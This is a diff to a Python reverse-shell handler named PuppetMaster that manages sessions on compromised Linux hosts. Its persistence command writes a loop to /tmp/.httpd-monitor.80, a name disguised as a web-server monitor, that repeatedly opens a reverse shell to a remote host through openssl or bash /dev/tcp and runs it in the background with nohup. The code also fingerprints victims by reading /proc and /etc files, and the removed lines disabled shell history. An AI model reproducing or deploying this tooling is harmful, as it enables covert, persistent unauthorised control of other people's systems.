@@ -38,10 +38,10 @@ class PuppetMaster:
         self.sessions = list()
         self.handlers = list()
         self.quiet              = False
-        self.Persistence        = True
+        self.Persistence        = False
         self.current_session    = None
         self.DuplicateSession   = False
-        self.PersistenceCommand = f'[ ! "$(ps -ef|grep /tmp/.httpd-monitor.80|grep -v grep)" ] && echo "while true;do sleep 474;(mkfifo /tmp/-;bash -i</tmp/-|&openssl s_client -quiet -connect {reverse_host}:{reverse_ssl_port}>/tmp/-;rm /tmp/-)||(bash -i>&/dev/tcp/{reverse_host}/{reverse_tcp_port} 0>&1); done;">/tmp/.httpd-monitor.80 && chmod +x /tmp/.httpd-monitor.80 && (nohup bash /tmp/.httpd-monitor.80 >/dev/null 2>&1 &)'
+        self.PersistenceCommand = f'(ps -ef|grep /tmp/.httpd-monitor.80|grep -v grep) || (echo "while true;do sleep 474;(mkfifo /tmp/-;bash -i</tmp/-|&openssl s_client -quiet -connect {reverse_host}:{reverse_ssl_port}>/tmp/-;rm /tmp/-)||(bash -i>&/dev/tcp/{reverse_host}/{reverse_tcp_port} 0>&1); done;">/tmp/.httpd-monitor.80 && chmod +x /tmp/.httpd-monitor.80 && (nohup bash /tmp/.httpd-monitor.80 >/dev/null 2>&1 &))'
 
     async def execute_cmd(self, command):
         command = command + "\n"
@@ -91,7 +91,6 @@ async def handle_shell_init(reader, writer):
             await asyncio.sleep(4)
 
             data = await asyncio.wait_for( reader.read(40960), timeout=10 )
-
             init_data += data
             if randomStringInitPrefix in data.decode().replace(f"echo {randomStringInitPrefix}", ""):
                 break
@@ -107,20 +106,53 @@ async def handle_shell_init(reader, writer):
             print(traceback.format_exc())
             writer.close()
             return None
-    
-    init_command = str()
-    init_command += "export HISTSIZE=0;"
-    init_command += f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix}\n"
-    init_command += f"echo {randomStringCPUinfoPrefix} && cat /proc/cpuinfo && echo {randomStringCPUinfoSuffix}\n"
-    init_command += f"echo {randomStringHostnamePrefix} && (hostname||cat /etc/hostname) && echo {randomStringHostnameSuffix}\n"
-    init_command += f"echo {randomStringHashPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route && echo {randomStringHashSuffix}\n"
-    writer.write( init_command.encode() )
+
+    writer.write( f"echo {randomStringHashPrefix}; whoami; cat /proc/version /etc/fstab /proc/net/route; echo {randomStringHashSuffix}\n".encode() )
     await writer.drain()
+
+    while True:
+        try:
+            data = await asyncio.wait_for( reader.read(40960), timeout=10 )
+            init_data += data
+
+            if (randomStringHashSuffix in data.decode().replace(f"echo {randomStringHashSuffix}", "")) and (randomStringHashPrefix in data.decode().replace(f"echo {randomStringHashPrefix}", "")):
+                # getTextBetweenStrings()未匹配到则返回<unknown>,若hostname或uesrname中包含也返回<unknown>
+                puppetHash = getTextBetweenStrings(
+                        init_data.decode().replace(f"echo {randomStringHashPrefix}", "").replace(f"echo {randomStringHashSuffix}", ""),
+                        randomStringHashPrefix,
+                        randomStringHashSuffix
+                        ).strip()
+
+                if puppetHash=="<unknown>":
+                    continue
+                else:
+                    break
+
+            elif data.decode() and ( (randomStringHashPrefix not in data.decode()) or (randomStringHashSuffix not in data.decode()) ):
+                writer.write( f"echo {randomStringHashPrefix}; whoami; cat /proc/version /etc/fstab /proc/net/route; echo {randomStringHashSuffix}\n".encode() )
+                await writer.drain()
+
+        except asyncio.TimeoutError:
+            writer.close()
+            return None
+
+        except Exception as e :
+            print("Error Hash:")
+            print(traceback.format_exc())
+            writer.close()
+            return None
 
     #如果持久化选项为True则执行deamon进程持久化命令
     if Puppet_Master.Persistence:
         writer.write( Puppet_Master.PersistenceCommand.encode() + "\n".encode() )
         await writer.drain()
+
+    init_command  = str()
+    init_command += f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix}\n"
+    init_command += f"echo {randomStringCPUinfoPrefix} && cat /proc/cpuinfo && echo {randomStringCPUinfoSuffix}\n"
+    init_command += f"echo {randomStringHostnamePrefix} && (hostname||cat /etc/hostname) && echo {randomStringHostnameSuffix}\n"
+    writer.write( init_command.encode() )
+    await writer.drain()
 
     writer.write( f"echo {randomStringInitSuffix}\n".encode() )
     await writer.drain()
@@ -132,12 +164,6 @@ async def handle_shell_init(reader, writer):
 
             if randomStringInitSuffix in data.decode().replace(f"echo {randomStringInitSuffix}", ""):
                 # getTextBetweenStrings()未匹配到则返回<unknown>,若hostname或uesrname中包含也返回<unknown>
-                puppetHash = getTextBetweenStrings(
-                        init_data.decode().replace(f"echo {randomStringHashPrefix}", "").replace(f"echo {randomStringHashSuffix}", ""),
-                        randomStringHashPrefix,
-                        randomStringHashSuffix
-                        ).strip()
-
                 username = getTextBetweenStrings(
                         init_data.decode().replace(f"echo {randomStringWhoamiPrefix}", "").replace(f"echo {randomStringWhoamiSuffix}", ""),
                         randomStringWhoamiPrefix,
@@ -354,6 +380,7 @@ def getTextBetweenStrings(text, start_string, end_string):
     start_index = text.rfind(start_string) + len(start_string)
     end_index = text.rfind(end_string, start_index)
     return text[start_index:end_index]
+
 import urllib.request
 import json
 
